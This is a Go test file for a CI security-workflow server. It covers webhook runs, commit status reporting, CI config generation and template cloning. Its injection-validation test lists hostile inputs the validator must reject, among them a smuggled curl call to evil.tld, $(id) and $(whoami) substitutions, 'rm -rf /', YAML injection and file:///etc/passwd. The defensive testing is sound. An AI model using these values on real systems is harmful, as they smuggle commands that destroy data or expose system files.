package main

import (
	"context"
	"strings"
	"testing"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"

	secflowv1 "github.com/secflow/secflow/packages/proto/gen/go/secflow/v1"
)

type captureNotifyClient struct {
	secflowv1.NotifyServiceClient
	calls chan *secflowv1.SendCommitStatusRequest
}

func (c *captureNotifyClient) SendCommitStatus(_ context.Context, req *secflowv1.SendCommitStatusRequest, _ ...grpc.CallOption) (*secflowv1.SendCommitStatusResponse, error) {
	c.calls <- req
	return &secflowv1.SendCommitStatusResponse{Delivered: true, HttpStatus: 201}, nil
}

func waitCommitStatus(t *testing.T, ch <-chan *secflowv1.SendCommitStatusRequest) *secflowv1.SendCommitStatusRequest {
	t.Helper()
	select {
	case req := <-ch:
		return req
	case <-time.After(3 * time.Second):
		t.Fatal("timed out waiting for SendCommitStatus call")
		return nil
	}
}

func TestStartRunFromWebhook_PreservesTriggerRejectsDuplicateAndSendsCommitStatus(t *testing.T) {
	t.Setenv("SECFLOW_PUBLIC_URL", "https://secflow.example.org")

	s := newServer()
	notifyCap := &captureNotifyClient{calls: make(chan *secflowv1.SendCommitStatusRequest, 8)}
	s.setNotifyClient(notifyCap)

	ctx, cancel := context.WithTimeout(t.Context(), 5*time.Second)
	defer cancel()
	s.startPump(ctx)

	wfResp, err := s.CreateWorkflow(ctx, &secflowv1.CreateWorkflowRequest{
		Name: "Webhook CI Gate",
		Graph: &secflowv1.WorkflowGraph{
			SchemaVersion: 1,
			Nodes: []*secflowv1.WorkflowNode{
				{
					Id:         "wh_trigger",
					PluginId:   "trigger.webhook",
					ParamsJson: []byte(`{"gitProvider":"GITHUB","events":["push"],"reportCommitStatus":true,"commitStatusContext":"secflow/ci-gate"}`),
					SecretBindings: []*secflowv1.SecretBinding{
						{ParamKey: "webhookSecret", SecretRef: "sec_wh"},
						{ParamKey: "gitStatusToken", SecretRef: "sec_status_tok"},
					},
				},
				{
					Id:         "gate_1",
					PluginId:   "gate.policy",
					ParamsJson: []byte(`{"failOnSeverity":"HIGH","warnOnSeverity":"MEDIUM"}`),
				},
			},
			Edges: []*secflowv1.WorkflowEdge{
				{Id: "e1", SourceNodeId: "wh_trigger", SourceHandle: "default", TargetNodeId: "gate_1", TargetHandle: "default"},
			},
		},
	})
	if err != nil {
		t.Fatalf("CreateWorkflow: %v", err)
	}
	wfID := wfResp.GetWorkflow().GetId()
	prNum := int32(42)

	startResp, err := s.StartRunFromWebhook(ctx, &secflowv1.StartRunFromWebhookRequest{
		WorkflowId:     wfID,
		IdempotencyKey: "gh-delivery-123",
		Trigger: &secflowv1.TriggerMetadata{
			Type:            secflowv1.TriggerType_TRIGGER_TYPE_WEBHOOK,
			GitProvider:     secflowv1.GitProvider_GIT_PROVIDER_GITHUB,
			RepoUrl:         "https://github.com/TBagirov/training",
			Branch:          "main",
			CommitSha:       "deadbeef1234",
			PrNumber:        &prNum,
			DeliveryId:      "gh-delivery-123",
			TriggeredBy:     "octocat",
			CommitStatusUrl: "https://api.github.com/repos/TBagirov/training/statuses/deadbeef1234",
		},
	})
	if err != nil {
		t.Fatalf("StartRunFromWebhook: %v", err)
	}

	run := startResp.GetRun()
	tr := run.GetTrigger()
	if tr.GetType() != secflowv1.TriggerType_TRIGGER_TYPE_WEBHOOK ||
		tr.GetGitProvider() != secflowv1.GitProvider_GIT_PROVIDER_GITHUB ||
		tr.GetRepoUrl() != "https://github.com/TBagirov/training" ||
		tr.GetBranch() != "main" ||
		tr.GetCommitSha() != "deadbeef1234" ||
		tr.GetPrNumber() != 42 ||
		tr.GetDeliveryId() != "gh-delivery-123" ||
		tr.GetTriggeredBy() != "octocat" ||
		tr.GetCommitStatusUrl() != "https://api.github.com/repos/TBagirov/training/statuses/deadbeef1234" {
		t.Fatalf("StartRunFromWebhook did not preserve TriggerMetadata: %+v", tr)
	}

	// Duplicate deliveryId MUST return codes.AlreadyExists with DUPLICATE_DELIVERY.
	_, dupErr := s.StartRunFromWebhook(ctx, &secflowv1.StartRunFromWebhookRequest{
		WorkflowId:     wfID,
		IdempotencyKey: "gh-delivery-123",
		Trigger: &secflowv1.TriggerMetadata{
			Type:       secflowv1.TriggerType_TRIGGER_TYPE_WEBHOOK,
			DeliveryId: "gh-delivery-123",
		},
	})
	if status.Code(dupErr) != codes.AlreadyExists || !strings.Contains(dupErr.Error(), "DUPLICATE_DELIVERY") {
		t.Fatalf("duplicate delivery err = %v, want AlreadyExists DUPLICATE_DELIVERY", dupErr)
	}

	// Collect both PENDING and final SUCCESS commit status calls (async order may vary under load).
	seenStates := map[secflowv1.CommitStatusState]*secflowv1.SendCommitStatusRequest{}
	for range 2 {
		cb := waitCommitStatus(t, notifyCap.calls)
		seenStates[cb.GetState()] = cb
		if cb.GetRunId() != run.GetId() ||
			cb.GetWorkflowId() != wfID ||
			cb.GetTriggerNodeId() != "wh_trigger" ||
			cb.GetGitStatusSecretRef() != "sec_status_tok" ||
			cb.GetContext() != "secflow/ci-gate" ||
			cb.GetTargetUrl() != "https://secflow.example.org/runs/"+run.GetId() {
			t.Fatalf("unexpected SendCommitStatus payload: %+v", cb)
		}
	}
	if seenStates[secflowv1.CommitStatusState_COMMIT_STATUS_STATE_PENDING] == nil {
		t.Fatalf("missing PENDING commit status, got %+v", seenStates)
	}
	if seenStates[secflowv1.CommitStatusState_COMMIT_STATUS_STATE_SUCCESS] == nil {
		t.Fatalf("missing SUCCESS commit status, got %+v", seenStates)
	}
}

func TestStartRunFromWebhook_FailureAndGateFailDispatchFailureCommitStatus(t *testing.T) {
	t.Setenv("SECFLOW_PUBLIC_URL", "https://secflow.local")
	s := newServer()
	notifyCap := &captureNotifyClient{calls: make(chan *secflowv1.SendCommitStatusRequest, 8)}
	s.setNotifyClient(notifyCap)

	ctx, cancel := context.WithTimeout(t.Context(), 5*time.Second)
	defer cancel()

	// Workflow with gate_1 that fails when run fails or gateResult == FAIL.
	wfResp, err := s.CreateWorkflow(ctx, &secflowv1.CreateWorkflowRequest{
		Name: "Webhook Fail Gate",
		Graph: &secflowv1.WorkflowGraph{
			SchemaVersion: 1,
			Nodes: []*secflowv1.WorkflowNode{
				{
					Id:         "wh_t",
					PluginId:   "trigger.webhook",
					ParamsJson: []byte(`{"gitProvider":"GITHUB","reportCommitStatus":true}`),
					SecretBindings: []*secflowv1.SecretBinding{
						{ParamKey: "webhookSecret", SecretRef: "sec_wh"},
						{ParamKey: "gitStatusToken", SecretRef: "sec_tok"},
					},
				},
			},
		},
	})
	if err != nil {
		t.Fatalf("CreateWorkflow: %v", err)
	}
	wfID := wfResp.GetWorkflow().GetId()

	// Verify gate FAIL produces COMMIT_STATUS_STATE_FAILURE even when RunStatus is SUCCEEDED.
	state, desc := deriveTerminalCommitStatus(secflowv1.RunStatus_RUN_STATUS_SUCCEEDED, &secflowv1.GateResult{
		Status: secflowv1.GateStatus_GATE_STATUS_FAIL,
		Reason: "1 CRITICAL finding",
	})
	if state != secflowv1.CommitStatusState_COMMIT_STATUS_STATE_FAILURE || !strings.Contains(desc, "CRITICAL") {
		t.Fatalf("deriveTerminalCommitStatus(SUCCEEDED, GATE_FAIL) = (%v, %q)", state, desc)
	}

	// Verify failRun dispatches FAILURE commit status.
	st := &runState{
		run: &secflowv1.Run{
			Id:         "run_fail_1",
			WorkflowId: wfID,
			Status:     secflowv1.RunStatus_RUN_STATUS_FAILED,
			Trigger: &secflowv1.TriggerMetadata{
				Type:            secflowv1.TriggerType_TRIGGER_TYPE_WEBHOOK,
				GitProvider:     secflowv1.GitProvider_GIT_PROVIDER_GITHUB,
				CommitSha:       "badsha",
				CommitStatusUrl: "https://api.github.com/repos/TBagirov/training/statuses/badsha",
			},
		},
	}
	s.failRun(ctx, st, "worker failed")
	cb := waitCommitStatus(t, notifyCap.calls)
	if cb.GetState() != secflowv1.CommitStatusState_COMMIT_STATUS_STATE_FAILURE ||
		cb.GetTargetUrl() != "https://secflow.local/runs/run_fail_1" ||
		cb.GetGitStatusSecretRef() != "sec_tok" {
		t.Fatalf("failRun commit status = %+v", cb)
	}
}

func TestGenerateCiConfig_InjectionValidationAndGateOptions(t *testing.T) {
	s := newServer()

	badWorkflowIDs := []struct {
		name string
		id   string
	}{
		{"empty", ""},
		{"shell injection quotes", `wf_1"; curl https://evil.tld; #`},
		{"command substitution", `wf_$(id)`},
		{"spaces", "wf 123"},
		{"path traversal", "../wf_1"},
		{"too long", strings.Repeat("a", 65)},
	}
	for _, tc := range badWorkflowIDs {
		t.Run("rejects workflowId "+tc.name, func(t *testing.T) {
			_, err := s.GenerateCiConfig(t.Context(), &secflowv1.GenerateCiConfigRequest{
				WorkflowId:     tc.id,
				Provider:       secflowv1.CiProvider_CI_PROVIDER_GITHUB_ACTIONS,
				SecflowBaseUrl: "https://secflow.local",
			})
			if status.Code(err) != codes.InvalidArgument {
				t.Fatalf("workflowId=%q got err=%v, want InvalidArgument", tc.id, err)
			}
		})
	}

	badBaseURLs := []struct {
		name string
		url  string
	}{
		{"semicolon injection", "https://secflow.local; rm -rf /"},
		{"dollar expansion", "https://secflow.local/$(whoami)"},
		{"backticks", "https://secflow.local/`id`"},
		{"single quote", "https://secflow.local/'bad"},
		{"double quote", `https://secflow.local/"bad`},
		{"newline yaml injection", "https://secflow.local\n      - run: evil"},
		{"space", "https://secflow.local --evil"},
		{"non-http scheme", "file:///etc/passwd"},
		{"userinfo", "https://user:pass@secflow.local"},
	}
	for _, tc := range badBaseURLs {
		t.Run("rejects secflowBaseUrl "+tc.name, func(t *testing.T) {
			_, err := s.GenerateCiConfig(t.Context(), &secflowv1.GenerateCiConfigRequest{
				WorkflowId:     "wf_valid_1",
				Provider:       secflowv1.CiProvider_CI_PROVIDER_GITHUB_ACTIONS,
				SecflowBaseUrl: tc.url,
			})
			if status.Code(err) != codes.InvalidArgument {
				t.Fatalf("baseUrl=%q got err=%v, want InvalidArgument", tc.url, err)
			}
		})
	}

	t.Run("respects failOnSeverity and failOnPolicyGate=true", func(t *testing.T) {
		resp, err := s.GenerateCiConfig(t.Context(), &secflowv1.GenerateCiConfigRequest{
			WorkflowId:       "wf_gate_1",
			Provider:         secflowv1.CiProvider_CI_PROVIDER_GITHUB_ACTIONS,
			SecflowBaseUrl:   "https://secflow.local/",
			FailOnSeverity:   secflowv1.Severity_SEVERITY_HIGH,
			FailOnPolicyGate: true,
		})
		if err != nil {
			t.Fatalf("GenerateCiConfig: %v", err)
		}
		yml := resp.GetYamlContent()
		for _, want := range []string{`(CRITICAL|HIGH)`, `gateResult`, `GATE_STATUS`, `"FAIL"`} {
			if !strings.Contains(yml, want) {
				t.Fatalf("yaml missing %q:\n%s", want, yml)
			}
		}
	})

	t.Run("respects failOnSeverity=MEDIUM and failOnPolicyGate=false", func(t *testing.T) {
		resp, err := s.GenerateCiConfig(t.Context(), &secflowv1.GenerateCiConfigRequest{
			WorkflowId:       "wf_gate_2",
			Provider:         secflowv1.CiProvider_CI_PROVIDER_GITLAB_CI,
			SecflowBaseUrl:   "https://secflow.local",
			FailOnSeverity:   secflowv1.Severity_SEVERITY_MEDIUM,
			FailOnPolicyGate: false,
		})
		if err != nil {
			t.Fatalf("GenerateCiConfig: %v", err)
		}
		yml := resp.GetYamlContent()
		if !strings.Contains(yml, `(CRITICAL|HIGH|MEDIUM)`) {
			t.Fatalf("yaml missing MEDIUM severity check:\n%s", yml)
		}
		if strings.Contains(yml, `policy gateResult.status=FAIL`) {
			t.Fatalf("yaml must not fail on policy gate when failOnPolicyGate=false:\n%s", yml)
		}
	})
}

func TestCloneTemplate_IncrementsCloneCountAndSetsSourceTemplateID(t *testing.T) {
	s := newServer()

	before, err := s.GetTemplate(t.Context(), &secflowv1.GetTemplateRequest{TemplateId: "nightly-secret-watch"})
	if err != nil {
		t.Fatalf("GetTemplate: %v", err)
	}
	if before.GetTemplate().GetCloneCount() != 0 {
		t.Fatalf("initial cloneCount = %d, want 0", before.GetTemplate().GetCloneCount())
	}

	for i := int32(1); i <= 2; i++ {
		cloned, err := s.CloneTemplate(t.Context(), &secflowv1.CloneTemplateRequest{
			TemplateId:      "nightly-secret-watch",
			NewWorkflowName: "Cloned Flow",
		})
		if err != nil {
			t.Fatalf("CloneTemplate #%d: %v", i, err)
		}
		if cloned.GetWorkflow().GetSourceTemplateId() != "nightly-secret-watch" {
			t.Fatalf("SourceTemplateId = %q, want nightly-secret-watch", cloned.GetWorkflow().GetSourceTemplateId())
		}
		after, err := s.GetTemplate(t.Context(), &secflowv1.GetTemplateRequest{TemplateId: "nightly-secret-watch"})
		if err != nil {
			t.Fatalf("GetTemplate after #%d: %v", i, err)
		}
		if after.GetTemplate().GetCloneCount() != i {
			t.Fatalf("CloneCount after #%d = %d, want %d", i, after.GetTemplate().GetCloneCount(), i)
		}
	}
}
